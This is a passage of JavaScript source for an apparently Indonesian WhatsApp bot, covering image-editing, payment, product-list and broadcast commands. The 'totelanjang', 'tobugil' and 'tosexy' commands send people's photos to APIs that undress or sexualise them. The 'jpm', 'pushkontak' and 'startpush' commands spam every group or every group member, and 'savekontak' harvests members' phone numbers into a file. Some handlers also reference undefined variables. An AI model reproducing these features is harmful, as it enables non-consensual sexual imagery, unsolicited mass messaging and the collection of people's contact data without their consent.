              externalAdReply: {
                title: "W E R E W O L F",
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnail: await resize(thumb, 300, 175),
                sourceUrl: "",
                mediaUrl: thumb,
              },
            },
          }, {
            quoted: fakeQuoted
          }
        );
      }
    }
    db.users[m.sender].exp += 300;
    break
      /*
      EDIT IMG   
      */
      case 'rwm':
      case 'removewatermark':
      case 'removewm': {
    if (!isPremium) return m.reply(mess.prem)

    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';

    if (!/image/.test(mime)) return reply(`mana foto nya?`);

    reply('⏳ Sedang menghapus watermark...');

    let mediaPath;

    try {
        // download file
        mediaPath = await sock.downloadAndSaveMediaMessage(q);

        // kirim file lokal ke API
        const apiResult = await ezremove(mediaPath);

        if (!apiResult.result) {
            return reply("❌ Gagal menghapus watermark!");
        }

        const urlHasil = apiResult.result;

        // download hasil gambar
        const hasil = await axios.get(urlHasil, { responseType: 'arraybuffer' });

        await sock.sendMessage(m.chat, {
            image: hasil.data,
            caption: ""
        }, { quoted: m });

    } catch (error) {
        console.error('Error di removewm:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }

}
break;
      case 'luma':
case 'lumaai':
case 'ailuma': {

    if (!isPremium) return m.reply(mess.prem);

    const quotedMsg = m.quoted ? m.quoted : m;
    const mime = (quotedMsg.msg || quotedMsg).mimetype || '';

    if (!/image/.test(mime)) {
        return reply('📸 Kirim atau reply gambar untuk menggunakan fitur ini!');
    }

    reply('⏳ Upload & Generating Video...');

    let mediaPath;
    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(quotedMsg);
        const buffer = fs.readFileSync(mediaPath);

        const result = await Luma(buffer, (prog) => {
            reply(`⚙️ ${prog}`);
        });

        await sock.sendMessage(m.chat, {
            video: fs.readFileSync(result.file),
            caption: `🎬 Video berhasil dibuat!\n✨ Powered by LumaAI`
        }, { quoted: fakeQuoted });

    } catch (err) {
        console.error(err);
        reply(`❌ Error proses: ${err?.message || err}`);
    }

    if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
    if (result?.file && fs.existsSync(result.file)) fs.unlinkSync(result.file);

}
break;
       			case 'tofigurav3':
case 'tofigurav2':
case 'tofigura': {

if (!isPremium) return m.reply(mess.prem)

 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://api-faa.my.id/faa/${command}?url=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
       			
case 'jadisexy':
case 'tosexy': {

if (!isPremium) return m.reply(mess.prem)

 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://api-faa.my.id/faa/tosexy?url=${directLink}&kunci=boom`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'putihkan':
case 'hitamkan': {

if (!isPremium) return m.reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(directLink)}&prompt=${command} warna kulit nya`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'edit': {

if (!isPremium) return m.reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`⚠️ _Reply sebuah gambar dengan caption *${cmd}aiedit <prompt>*_\n\nContoh: ${cmd}l ubah jadi anime`);
    }
 
    if (!text) {
        return reply(`⚠️ Masukkan perintah edit (prompt)!\n\nContoh: ${cmd} ubah jadi sketsa pensil`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(text)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;    
case 'tobersama': {

if (!isPremium) return m.reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
    if (!text) return reply(`contoh ${cmd} nama idola mu`)
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://api-faa.my.id/faa/tobersama?url=${directLink}&nama-artis=${text}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;    
case 'tosad':
case 'tosatan':
case 'tosdmtinggi':
case 'toreal':
case 'tomoai':
case 'tomaya':
case 'tolego':
case 'tokamboja':
case 'tokacamata':
case 'tojepang':
case 'toghibli':
case 'todubai':
case 'todpr':
case 'tochibi':
case 'tobrewok':
case 'tobabi':
case 'toblonde':
case 'tobotak':
case 'tohijab':
case 'tomekah':
case 'tomirror':
case 'tovintage':
case 'toanime': {

if (!isPremium) return m.reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://api-faa.my.id/faa/${command}?url=${encodeURIComponent(directLink)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;    
case 'totelanjang':
case 'tobugil': {  
if (!isPremium) return m.reply(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
let media = await sock.downloadAndSaveMediaMessage(quoted);
let directLink = await uploaden(media);
const api = await fetchJson(`https://api.baguss.xyz/api/edits/tobugil?image=${directLink}`)
const result= api.url
await sock.sendMessage(
        m.chat,
        {
            image: { url: result },
            caption: "Done."
        },
        { quoted: m }
    );
}
break;    

/*
   PPOB
*/                         
case 'buysc':
case 'buyscript': {
  const ownerJid = [`${global.owner}@s.whatsapp.net`]
  for (let id of ownerJid)
    await sock.sendMessage(id, {
      text: `pesan ${cmd} dari @${m.sender.split("@")[0]}`,
      contextInfo:{ mentionedJid:[m.sender] }
    }, { quoted:m })

  if (!isPrivate) return reply(mess.private);

  // Tidak pakai nominal dari user → default 25000
  let nominal = 25000;

  // Fee keuntungan (max global.pay.fee)
  let profitFee = Math.floor(Math.random() * global.pay.fee) + 1;
  let expired = Date.now() + (30 * 60 * 1000); // 30 menit

  let dep, res, data;

  try {
    const params = new URLSearchParams({ 
      nominal: nominal + profitFee, 
      metode: global.pay.metode 
    });

    res = await fetch(`https://ciaatopup.my.id/h2h/deposit/create?${params}`, {
      headers: { 
        'X-APIKEY': global.pay.apikey, 
        'Content-Type': 'application/json' 
      }
    });

    data = await res.json();
    if (!data.success) {
      return sock.sendMessage(m.chat, { 
        text: `❌ Gagal membuat transaksi: ${data.message || 'Unknown error'}` 
      }, { quoted: fakeQuoted });
    }

    dep = data.data;

  } catch (err) {
    return sock.sendMessage(m.chat, { 
      text: `❌ Error sistem: ${err.message}` 
    }, { quoted: fakeQuoted });
  }

  if (!dep) {
    return sock.sendMessage(m.chat, { text: `❌ Error: Data tidak valid` }, { quoted: fakeQuoted });
  }

  // SIMPAN INVOICE
  if (!db.deposits) db.deposits = {};
  db.deposits[dep.id] = {
    user_id: m.sender,
    nominal,
    metode: global.pay.metode,
    status: "pending",
    expired_at: expired,
    profit_fee: profitFee,
    get_balance: dep.get_balance,
    fee_api: dep.fee,
    created_at: Date.now(),
    type: "buyscript"
  };
  fs.writeFileSync('./lib/database/database.json', JSON.stringify(db, null, 2));

  let infoText =
    `🛒 *PEMBELIAN SCRIPT*\n\n` +
    `📋 ID: ${dep.id}\n` +
    `💰 Harga: Rp${nominal.toLocaleString()}\n` +
    `⚙️ Fee: Rp${profitFee.toLocaleString()}\n` +
    `💸 Total Bayar: Rp${(nominal + profitFee).toLocaleString()}\n` +
    `⏰ Expired: 30 menit\n\n` +
    `Silakan scan QR dibawah untuk melanjutkan pembelian.`;

  // ===========================
  // FIX QR SEND (TANPA BUTTON)
  // ===========================
  try {
    let qr = await QRCode.toBuffer(dep.qr_string, { 
      width: 300, margin: 2, errorCorrectionLevel: 'M'
    });

    let sent = await sock.sendMessage(m.chat, {
      image: qr,
      caption: infoText
    }, { quoted: fakeQuoted });

    db.deposits[dep.id].messageId = sent.key.id;
    fs.writeFileSync('./lib/database/database.json', JSON.stringify(db, null, 2));

  } catch (err) {
    return sock.sendMessage(m.chat, { text:`Error QR: ${err.message}` }, { quoted:m });
  }

  // AUTO CEK STATUS
  let checker = setInterval(async () => {
    try {
      let depositData = db.deposits[dep.id];
      if (!depositData) return clearInterval(checker);

      // Expired
      if (Date.now() > depositData.expired_at) {
        clearInterval(checker);

        await fetch(`https://ciaatopup.my.id/h2h/deposit/cancel?id=${dep.id}`, {
          headers: { 'X-APIKEY': global.pay.apikey }
        });

        depositData.status = "expired";
        fs.writeFileSync('./lib/database/database.json', JSON.stringify(db, null, 2));

        return sock.sendMessage(m.chat, { 
          text: `❌ Pembelian ${dep.id} expired & dibatalkan.` 
        }, { quoted:m });
      }

      // Cek status API
      let cek = await fetch(`https://ciaatopup.my.id/h2h/deposit/status?id=${dep.id}`, {
        headers: { 'X-APIKEY': global.pay.apikey }
      });
      let cj = await cek.json();

      if (cj.success && cj.data.status === "success") {
        clearInterval(checker);

        depositData.status = "success";
        fs.writeFileSync('./lib/database/database.json', JSON.stringify(db, null, 2));

        // KIRIM FILE SCRIPT ZIP
        await sock.sendMessage(m.chat, {
          document: { url: "https://raw.githubusercontent.com/zionjs0/whatsapp-media/main/file_1764092341730" },
          mimetype: "application/zip",
          fileName: "Lyrra-Script.zip",
          caption: `🎉 *PEMBELIAN BERHASIL*\n\nTerima kasih!\nBerikut file script Anda.\n\nJoin Group Update\nhttps://chat.whatsapp.com/Ly3VsAtRTTs8zhhNpxtNfA`
        }, { quoted: fakeQuoted });

        return;
      }

    } catch (err) {
      console.log("Auto cek error:", err);
    }
  }, 1000);

  if (!global.depositCheckers) global.depositCheckers = {};
  global.depositCheckers[dep.id] = checker;
}
break;
/*
EPHOTO
*/
      case "glitchtext":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloyellowneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
        {
        
          if (!q) {
            return reply(`Contoh : ${cmd} sock Assistent`);
          }
          let link;
          if (/glitchtext/.test(command)) {
            link = "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          }
          if (/writetext/.test(command)) {
            link = "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          }
          if (/advancedglow/.test(command)) {
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          }
          if (/typographytext/.test(command)) {
            link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          }
          if (/pixelglitch/.test(command)) {
            link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          }
          if (/neonglitch/.test(command)) {
            link = "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          }
          if (/flagtext/.test(command)) {
            link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          }
          if (/flag3dtext/.test(command)) {
            link = "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          }
          if (/deletingtext/.test(command)) {
            link = "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          }
          if (/blackpinkstyle/.test(command)) {
            link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          }
          if (/glowingtext/.test(command)) {
            link = "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          }
          if (/underwatertext/.test(command)) {
            link = "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          }
          if (/logomaker/.test(command)) {
            link = "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          }
          if (/cartoonstyle/.test(command)) {
            link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          }
          if (/papercutstyle/.test(command)) {
            link = "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          }
          if (/watercolortext/.test(command)) {
            link = "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          }
          if (/effectclouds/.test(command)) {
            link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          }
          if (/blackpinklogo/.test(command)) {
            link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          }
          if (/gradienttext/.test(command)) {
            link = "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          }
          if (/summerbeach/.test(command)) {
            link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          }
          if (/luxurygold/.test(command)) {
            link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          }
          if (/multicoloyellowneon/.test(command)) {
            link = "https://en.ephoto360.com/create-multicoloyellow-neon-light-signatures-591.html";
          }
          if (/sandsummer/.test(command)) {
            link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          }
          if (/galaxywallpaper/.test(command)) {
            link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          }
          if (/1917style/.test(command)) {
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          }
          if (/makingneon/.test(command)) {
            link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          }
          if (/royaltext/.test(command)) {
            link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          }
          if (/freecreate/.test(command)) {
            link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          }
          if (/galaxystyle/.test(command)) {
            link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          }
          if (/lighteffects/.test(command)) {
            link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
          }
          let haldwhd = await ephoto(link, q);
          sock.sendMessage(m.chat, {
            image: {
              url: haldwhd
            },
            caption: `${name}`
          }, {
            quoted: fakeQuoted
          });
        }
        break;
        /*
        PUSH
        */
        case "addidch":
        case "addch": {
    if (!isOwner) return reply("❌ Fitur ini hanya untuk Owner bot!");
    if (!text) return reply(`⚙️ Contoh penggunaan:\n.addch 1203630xxxxx@newsletter`);

    const fs = require("fs");
    const path = "./lib/database/broadcast.json";

    try {
        // Baca file broadcast.json
        let data = [];
        if (fs.existsSync(path)) {
            data = JSON.parse(fs.readFileSync(path));
        }

        // Tambahkan ID baru jika belum ada
        if (data.includes(text)) return reply("⚠️ ID saluran sudah terdaftar di broadcast list!");
        data.push(text);
        fs.writeFileSync(path, JSON.stringify(data, null, 2));

        reply(`✅ Berhasil menambahkan ID saluran:\n${text}`);
    } catch (e) {
        console.error(e);
        reply("❌ Gagal menambahkan ID saluran ke broadcast.json");
    }
}
break;
        case "jpmch":
        case "broadcastch": {
    if (!isOwner) return reply("❌ Fitur ini hanya untuk Owner bot!");
    if (!text) return reply(`📢 Contoh penggunaan:\n.broadcastch Halo semua!`);

    const fs = require("fs");
    const path = "./lib/database/broadcast.json";

    try {
        if (!fs.existsSync(path)) return reply("⚠️ File broadcast.json belum ada. Tambahkan saluran dulu dengan .addch");
        const list = JSON.parse(fs.readFileSync(path));

        if (!Array.isArray(list) || list.length === 0)
            return reply("⚠️ Belum ada ID saluran di broadcast list!");

        reply(`📡 Mengirim broadcast ke *${list.length}* saluran...`);

        for (let id of list) {
            await sock.sendMessage(id, { text });
            await sleep(1000); // delay 1 detik biar aman
        }

        reply(`✅ Broadcast berhasil terkirim ke semua saluran!`);
    } catch (e) {
        console.error(e);
        reply("❌ Terjadi kesalahan saat broadcast ke saluran.");
    }

    // Fungsi delay
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}
break;
        case 'jpm': case 'post': case 'pushcontactgc': {
if (!isOwner) return reply("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!text) return reply(`*Incorrect Usage Please Use Like This*\n${cmd} text|pause\n\nreply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${cmd} hello|9000`)
await reply(`In progress...`)
let getGroups = await sock.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await sock.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await sock.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await sock.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: [m.sender] })
await sleep(text.split('|')[1])
} else {
await sock.sendMessage(xnxx, { text: text.split('|')[0], mentions: [m.sender] })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break
case "pushcontact":
case "pushkontak": {
if (!isOwner) return reply(mess.owner)
    if (!text) return reply(`Format salah!

Contoh:
.pushkontak Halo semua.2000
(2000 = jeda per pesan dalam ms)
`);

    // Pisah dari titik terakhir
    let lastDot = text.lastIndexOf(".");
    if (lastDot === -1) return reply(`Format harus pakai titik!\nContoh: .pushkontak Halo.2000`);

    let pesan = text.slice(0, lastDot).trim();
    let jeda = text.slice(lastDot + 1).trim();

    if (!pesan) return reply("Pesan tidak boleh kosong!");
    if (!jeda || isNaN(jeda)) return reply("Jeda harus berupa angka (ms). Contoh: 2000");

    global.broadcastText = pesan;
    global.broadcastDelay = Number(jeda);

    reply(`✔️ Pesan broadcast disimpan!
📝 Pesan: ${pesan}
⏱️ Jeda: ${jeda} ms

Gunakan *.pilihgrup* untuk memilih grup.
`);
}
break;
case 'listgrup':
case 'pilihgrup': {
    let groups = Object.values(await sock.groupFetchAllParticipating());

    if (groups.length === 0) return reply("Kamu tidak punya grup.");

    for (let i = 0; i < groups.length; i += 3) {

        let batch = groups.slice(i, i + 3);

        let buttons = batch.map(g => ({
            buttonId: `.settarget ${g.id}`,
            buttonText: { displayText: g.subject },
            type: 1
        }));

        await sock.sendMessage(m.chat, {
            text: `Pilih grup untuk target broadcast:\nBatch ${i / 3 + 1}`,
            footer: "Broadcast System",
            buttons,
            headerType: 1
        });

    }
}
break;
case 'startpush': {
    if (!global.broadcastText) return reply("❌ Pesan belum diset. Gunakan *.pushkontak*");
    if (!global.broadcastTarget) return reply("❌ Target grup belum dipilih. Gunakan *.pilihgrup*");
    if (!global.broadcastDelay) global.broadcastDelay = 1000; // default 1 detik

    let meta = await sock.groupMetadata(global.broadcastTarget);
    let members = meta.participants.map(p => p.id);

    reply(`🚀 Memulai broadcast...
📝 Pesan: ${global.broadcastText}
👥 Target: ${meta.subject}
⏱️ Jeda: ${global.broadcastDelay} ms
`);

    let success = 0;
    let failed = 0;

    for (let jid of members) {
        try {
            await sock.sendMessage(jid, { text: global.broadcastText });
            success++;
            await sleep(global.broadcastDelay);
        } catch {
            failed++;
        }
    }

    reply(`✔️ Broadcast selesai!
Berhasil: ${success}
Gagal: ${failed}`);
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'settarget': {
    if (!text) return reply("ID grup tidak ditemukan!");

    global.broadcastTarget = text;

    reply(`✔️ Target broadcast di set:\n${text}\n\nKetik *.startpush* untuk mulai broadcast`);
}
break;
case "done": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply("jasa install panel")
let teks = `\n📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkch}
\n`
await sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: name, 
thumbnailUrl: thumbnail2, 
sourceUrl: null,
}}}, {quoted: null})
}
break 
case 'savecontact':
case 'savekontak': {
if (!isOwner) return reply(mess.owner)

    if (!m.isGroup) return reply(`Fitur ini hanya bisa di dalam grup.`);

    let meta = await sock.groupMetadata(m.chat);
    let members = meta.participants.map(p => p.id); // JID asli

    if (!members.length) return reply("Tidak ada member dalam grup.");

    reply(`📥 Mengambil semua kontak...\nTotal: ${members.length} member\nSedang membuat file vCard...`);

    let vcfContent = "";

    for (let jid of members) {
        let number = jid.split("@")[0];

        vcfContent += `BEGIN:VCARD
VERSION:3.0
FN:${number}
TEL;type=CELL;waid=${number}:${number}
END:VCARD

`;
    }

    // Simpan ke file
    let filename = `contact-${meta.subject.replace(/\W+/g, "_")}.vcf`;
    let filepath = `./${filename}`;

    fs.writeFileSync(filepath, vcfContent);

    await sock.sendMessage(m.sender, {
        document: fs.readFileSync(filepath),
        fileName: filename,
        mimetype: "text/vcard"
    });

    reply(`✔️ Semua kontak sudah dikirim ke chat pribadi dalam 1 file VCF!`);
}
break;
			case "proses": {
if (!isOwner) return repy(mess.owner)
if (!q) return m.reply("jasa install panel")
let teks = `\n📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkch}\n`
await sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: name, 
thumbnailUrl: thumbnail2, 
sourceUrl: null,
}}}, {quoted: null})
}
break    
case "pay":
case "payment": {
const media = await prepareWAMessageMedia(
  { image: { url: qris } }, // ganti URL atau pakai file
  { upload: sock.waUploadToServer }
);

const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({

                // HEADER DENGAN FOTO
                header: proto.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: true,
                    title: teks,
                    subtitle: "",
                    imageMessage: media.imageMessage,   // << FOTO MASUK DI SINI
                    headerType: 4 // wajib 4 untuk image header
                }),

                // BODY TEXT
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teks
                }),

                // TOMBOL COPY
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [

                        // DANA
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: `DANA [${namadana}]`,
                                id: dana,
                                copy_code: dana
                            })
                        },

                        // GOPAY
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: `GOPAY [${namagopay}]`,
                                id: gopay,
                                copy_code: gopay
                            })
                        },

                        // OVO
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: `OVO [${namaovo}]`,
                                id: ovo,
                                copy_code: ovo
                            })
                        }

                    ]
                })
            })
        }
    }
}, {});

await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
});
}
  break   
  case 'addproduk': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
reply(`Produk dengan nama "${productName}" sudah ada.`)
} else {
addprodukzz(productName, harga, jumlahStok)
reply(`Produk "${productName}" telah ditambahkan dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
}}}
break

case 'delproduk': {

if (!text) return reply(`Contoh: ${cmd} nama_produk`)
const productName = text.trim()
if (!productName) {
reply('Nama produk tidak valid.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
delprodukzz(productName)
reply(`Produk "${productName}" telah dihapus.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'updateproduk': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, harga, stok`)
const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
const harga = parseInt(price, 10)
const jumlahStok = parseInt(stock, 10)
if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
} else {
const productExists = cekProduknye(productName)
if (productExists) {
updprodukzz(productName, harga, jumlahStok)
reply(`Produk "${productName}" telah diperbarui dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
} else {
reply(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'listproduk': {

const products = getprodukdb()
const discounts = getDisczz()
if (products.length === 0) {
reply('Tidak ada produk yang tersedia saat ini.')
} else {
let listText = `List produk yg tersedia:\nTotal: ${products.length}\n\n`
products.forEach(product => {
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
if (discount) {
const discountPercentage = persenDiskonnya(product.harga, discount.harga_diskon)
listText += `• ${product.nama}\n  Harga: ~Rp${toRupiah(product.harga)}~ > Rp${toRupiah(discount.harga_diskon)} (${discountPercentage}%)\n  Stok: ${product.stok} unit\n\n`
} else {
listText += `• ${product.nama}\n  Harga: Rp${toRupiah(product.harga)}\n  Stok: ${product.stok} unit\n\n`
}})
reply(listText)
}}
break

case 'donate':
;

case 'diskon': {

if (!text.includes(',')) return reply(`Contoh: ${cmd} nama_produk, harga_diskon, tgl-bln-th`)
const [productName, discountPriceStr, expirationDate] = args.join(' ').split(',').map(item => item.trim())
const discountPrice = parseInt(discountPriceStr, 10)
if (!productName || isNaN(discountPrice) || !expirationDate) {
reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga diskon, dan tanggal kadaluarsa yang valid.')
} else {
const products = getprodukDariFile()
